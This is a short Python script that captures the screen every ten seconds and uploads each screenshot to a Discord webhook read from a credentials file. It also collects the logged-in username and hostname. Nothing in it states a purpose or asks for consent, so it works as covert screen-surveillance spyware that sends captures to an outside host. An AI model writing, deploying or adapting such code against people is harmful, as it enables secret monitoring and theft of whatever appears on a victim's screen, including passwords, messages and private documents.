import time
import os
import pyautogui
import requests
import json
import os
import socket

# Get the username of the currently logged-in user
username = os.getlogin()

# Get the hostname of the computer
hostname = socket.gethostname()
with open("credentials.json", "r") as f:
    credentials = json.load(f)

WEBHOOK_URL = credentials["discord_webhook"]["screenshot_webhook_url"]

# Directory to save screenshots
save_dir = "screenshots"
if not os.path.exists(save_dir):
    os.makedirs(save_dir)

# Capture screenshots every 10 seconds
try:
    while True:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        screenshot = pyautogui.screenshot()
        file_path = f"{save_dir}/screenshot_{timestamp}.png"
        screenshot.save(file_path)
        with open(file_path, "rb") as f:
            payload = {
                            "content": f"File sent from **{username}** ({hostname})"
                        }
            requests.post(WEBHOOK_URL, files={"file": f})
        time.sleep(10)
except KeyboardInterrupt:
    print("Screenshot capture stopped.")